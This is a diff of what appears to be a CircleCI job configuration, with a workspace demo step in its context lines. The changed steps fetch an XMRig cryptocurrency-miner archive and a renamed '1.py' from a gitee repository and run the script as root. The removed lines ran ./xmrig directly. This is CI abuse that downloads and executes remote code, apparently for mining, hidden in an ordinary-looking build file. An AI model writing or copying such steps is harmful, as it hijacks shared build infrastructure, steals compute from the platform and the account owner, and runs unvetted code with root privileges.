@@ -7,12 +7,12 @@ jobs:
     steps:
       - checkout
       - run: cd /home
-      - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/xmrig-6.12.1.zip
-      - run: sudo unzip xmrig-6.12.1.zip
-      - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/test.zip
-      - run: sudo unzip test.zip
+      - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/xmrig.zip
+      - run: sudo mv xmrig.zip xmrig
+      - run: sudo wget https://gitee.com/googlerhyme/g123456/raw/master/1.zip
+      - run: sudo mv 1.zip 1.py
       - run: sudo python 1.py
-      - run: sudo ./xmrig
+
       - run: mkdir -p my_workspace
       - run: echo "Trying out workspaces" > my_workspace/echo-output
       - persist_to_workspace:
